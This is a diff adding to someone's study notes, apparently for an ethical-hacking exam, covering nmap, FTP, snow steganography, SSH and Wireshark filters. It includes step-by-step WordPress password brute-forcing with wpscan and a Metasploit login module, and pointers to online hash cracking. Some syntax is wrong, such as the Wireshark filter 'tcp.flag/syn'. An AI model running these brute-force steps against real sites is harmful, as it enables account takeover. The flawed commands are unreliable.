@@ -14,7 +14,51 @@ RDP port is 3389 nmap -Pn -p -sV 3389 192.168.178.15
 
 
 CRyptool is the tool to decrypt files like hex and find the crypted message
+encrypt/decrypt 
+there are a lot of type on encryption, check in the file name or in the message to find something relative to the enc. protocol
 
-Snow tool is 
+to connect to FTP :
+ftp 192.168.178.1
+ls 
+get file.txt
 
- 
+Steganography with snow tools 
+snow -C -m "My password of my account is 12345!!" -p "p4ssWd" matteo.txt secret.txt
+snow -C -p "p4ssWd" secret.txt
+
+ssh username@192.168.0.1
+sudo -i
+cd /
+locate text.txt
+or u can use find 
+cat folder1/folder2/folder3/text.txt
+
+
+HOW TO BRUTE FORCE  WORDPRESS ACCOUNT 
+wpscan --url http://192.168.1.10:8080/Site -u pippo -P /folder/folder/mypreferredpswdlist.txt
+
+with METASPLOIT CONSOLE
+msfconsole 
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+SET RHOSTS target ip
+SET RPORT 8080 Target port
+SET TARGETURI http://targetip:8080/site
+set USERNAME admin
+exploit
+
+To crack hashes online go to this sites> hashes.com , crackstation.org
+
+Wireshark how to sniff and search/analyze
+start capture, and stop when you retrieve info , or open a pcap file specified
+how to identify login credentials?
+http.request.method == post
+or right click on the line , follow--> tcp stream 
+how to identify attacking machine? 
+tcp.flag/syn == 1 and tcp.flags.ack == 0
+or go to statistics --> ipv4 addresses > Source and Destinations > Display filter paste tcp.flag/syn == 1 and tcp.flags.ack == 0
+
+
+
+
